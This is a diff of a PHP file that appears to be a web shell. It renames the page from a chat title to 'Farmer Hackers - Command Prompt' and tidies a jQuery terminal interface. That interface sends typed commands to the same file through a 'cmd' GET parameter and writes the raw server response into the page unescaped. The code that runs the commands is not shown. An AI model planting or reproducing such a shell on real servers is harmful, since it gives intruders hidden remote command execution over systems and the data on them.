@@ -4,7 +4,7 @@ if(!isset($_REQUEST['cmd'])):?>
 <html>
   	<head>
     	<meta charset="UTF-8">
-    	<title>Le super Chat'</title>
+    	<title>Farmer Hackers - Command Prompt</title>
     	<meta name="viewport" content="width=device-width, initial-scale=1">
     	<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
     	<style type="text/css">
@@ -87,10 +87,8 @@ if(!isset($_REQUEST['cmd'])):?>
 			function initializingCommandeRowText(selector){
 				domElement = $(selector).first();
 				var textElement = domElement.text();
-				console.log(textElement.length);
 				textElement = textElement.substr(0,textElement.length-1);
 				domElement.text(textElement);
-				console.log(textElement.length);
 				return textElement;
 			}
 
@@ -104,8 +102,6 @@ if(!isset($_REQUEST['cmd'])):?>
 				});
 
 				input.on('keyup', function(e){
-					//#### Reprendre espaces ####
-					//request = input.val().replace(/[ ]/g,'');
 					if(e.which==38 && id>0){
 	  					id--;
 	  					input.val(commandeHistory.commandes[id].commande);
@@ -122,7 +118,6 @@ if(!isset($_REQUEST['cmd'])):?>
 					input.val(request);
 	  				$('div.commandeRow.active span.request').text(request);
 	  				body = $('body');
-	  				//body.scrollTop(body.height()-body.scrollTop())
 	  				body.scrollTop(body.height());
 				});
 
@@ -154,7 +149,6 @@ if(!isset($_REQUEST['cmd'])):?>
 			function getRequest(requestAttr, domChange){
 				$.get('<?php echo basename(__FILE__, '.php') ?>.php?cmd='+requestAttr, function(data){
 					if(domChange == null){
-						//escapeData = $('<i></i>').text(data).html();
 						$("div.container").append('<div class="answer">'+data+'</div>');
 						data.replace(/\n/g, "<br />");
 						newRequest();
